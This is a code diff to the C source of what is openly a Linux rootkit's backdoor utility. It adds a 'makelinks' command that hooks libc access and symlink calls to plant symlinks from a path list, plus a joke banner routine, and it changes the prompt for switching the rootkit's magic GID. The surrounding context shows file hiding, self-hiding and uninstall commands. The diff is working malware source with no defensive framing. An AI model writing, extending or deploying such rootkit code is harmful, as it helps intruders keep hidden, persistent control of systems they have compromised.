@@ -1,8 +1,24 @@
+#ifdef BACKDOOR_ROLF
+void dorolfpls(void){
+    printf("\033[0;31m");
+    for(int i = 0; i != BDANSI_SIZE; i++)
+        printf("%c", bdansi[i]);
+    printf("\033[0m\n");
+
+    size_t rolfsize = sizeofarr(rolfs);
+    srand(time(NULL));
+    char *randrolf = rolfs[rand() % rolfsize];
+    printf("\e[31m%s\e[0m\n", randrolf);
+    exit(0);
+}
+#endif
+
 void option_err(char *a0){
     printf("valid commands:\n");
     printf("\t%s hide/unhide <path>\n", a0);
     printf("\t%s uninstall\n", a0);
     printf("\t%s unhideself\n", a0);
+    printf("\t%s makelinks\n", a0);
 #ifdef READ_GID_FROM_FILE
     printf("\t%s changegid\n", a0);
 #endif
@@ -103,6 +119,30 @@ void do_self(void){
     exit(0);
 }
 
+void symlinkstuff(void){
+    hook(CACCESS, CSYMLINK);
+
+    char *current, *currentdup, *src, *dest;
+    for(int i = 0; i != sizeofarr(linkpaths); i++){
+        current = linkpaths[i];
+        currentdup = strdup(current);
+
+        src = strtok(currentdup, ":");
+        dest = strtok(NULL, ":");
+
+        if((long)call(CACCESS, src, F_OK) == 0){
+            if((long)call(CSYMLINK, src, dest) < 0){
+                if(errno != EEXIST)
+                    printf("Error linking %s (\e[31m%s\e[0m)\n", src, basename(dest));
+            }else printf("Link successful: \e[31m%s\e[0m.\n", basename(dest));
+        }
+
+        free(currentdup);
+    }
+
+    exit(0);
+}
+
 /* everything in here calls to misc rootkit utils. */
 void dobdvutil(char *const argv[]){
     char *option, *path;
@@ -143,8 +183,7 @@ void dobdvutil(char *const argv[]){
         printf("current magic GID: %d\n", readgid());
         printf("you are about to change the rootkit's GID.\n");
         printf("this backdoor process will be killed & you'll have to reconnect.\n");
-        printf("press enter if you really wanna do this.\n");
-        
+        printf("press enter if you really wanna do this.");
         getchar();
         
         newgid = changerkgid();
@@ -167,6 +206,9 @@ void dobdvutil(char *const argv[]){
 
     if(!strcmp("unhideself", option))
         do_self();
+
+    if(!strcmp("makelinks", option))
+        symlinkstuff();
 
     // option was neither changegid or unhideself.
     // file op desired.
